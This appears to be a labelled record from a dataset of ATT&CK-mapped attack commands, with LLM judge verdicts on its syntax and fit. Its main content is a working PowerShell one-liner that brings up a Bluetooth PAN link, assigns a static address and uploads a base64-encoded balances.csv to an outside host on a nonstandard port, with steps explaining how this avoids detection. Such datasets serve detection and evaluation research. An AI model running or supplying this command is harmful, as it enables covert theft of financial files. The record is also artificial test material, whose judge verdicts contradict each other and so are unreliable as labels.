command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 10.223.93.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\Public\Documents\balances.csv')); $ProgressPreference='SilentlyContinue'; Invoke-RestMethod -Uri 'http://10.223.93.1:52901/api/upload' -Method Put -Body $body -Headers @{ 'X-From'='btpan' } | Out-Null
explanation: Uses HTTP PUT to a custom port over a Bluetooth PAN-isolated subnet to exfiltrate base64 data, aligning with exfiltration over another network medium (T1011).
rationale_steps: Establish Bluetooth PAN connectivity using a Bluetooth manipulation tool.
Assign a static /30 address to the Bluetooth interface with netsh.
Send base64 data using HTTP on a nonstandard port to reduce detection.
Destination IP is only reachable over Bluetooth, forcing that medium.

llm_judgments.syntactic_justification: The PowerShell one-liner is well-formed with balanced quoting/parentheses, valid operators and separators, and parseable EXE/cmdlet invocations.
llm_judgments.semantic_justification: The command performs file exfiltration over a Bluetooth PAN via HTTP (aligned with exfiltration over another network medium) but does not exhibit traffic signaling behaviors described (e.g., covert signaling via headers/timing/fields to coordinate actions) and also depends on capabilities/privileges (e.g., netsh IP changes) that may not hold.

llm_judgments.syntactic_justification: The PowerShell command is perfectly well-formed with correct syntax for variable assignments, cmdlet usage, external executable calls, pipe operations, and hash table definitions.
llm_judgments.semantic_justification: The command perfectly achieves the claimed intent by establishing a Bluetooth PAN, configuring its network interface, base64 encoding a file, and exfiltrating it via HTTP PUT with a custom header ('X-From') that serves as a 'Traffic Signal' over this alternative network medium, aligning precisely with T1011's description.
